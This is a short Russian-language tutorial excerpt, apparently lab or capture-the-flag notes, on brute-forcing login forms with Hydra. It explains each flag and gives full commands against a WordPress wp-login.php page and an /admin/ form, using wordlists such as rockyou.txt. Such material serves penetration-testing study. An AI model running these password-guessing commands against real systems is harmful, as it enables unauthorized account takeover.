```bash
Hydra
Попробуем подобрать пароль с помощью Hydra.
Как мы уже знаем, при неверной авторизации возвращается код 200, а при успешной – 302. Попробуем использовать эту информацию.
Для запуска используем команду:

hydra -V -f -l admin -P /root/wordlist -t 4 http-post-form://192.168.60.50 -m "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.60.50%2Fwp-admin%2F&testcookie=1:S=302"

Здесь мы указываем обязательные параметры:
-l – имя пользователя
-P – словарь с паролями
-t – количество потоков
http-post-form – тип формы, у нас POST.
/wp-login.php – это URL страницы с авторизацией
^USER^ — показывает куда подставлять имя пользователя
^PASS^ — показывает куда подставлять пароль из словаря
S=302 – указание на какой ответ опираться Hydra. В нашем случае, ответ 302 при успешной авторизации.
```

### hydra
```bash
$ hydra -V -f -l fergus -P ~/Downloads/rockyou.txt -t 4 10.10.10.191 http-post-form  "/admin/:username=^USER^&password=^PASS^&save=:s500" 

```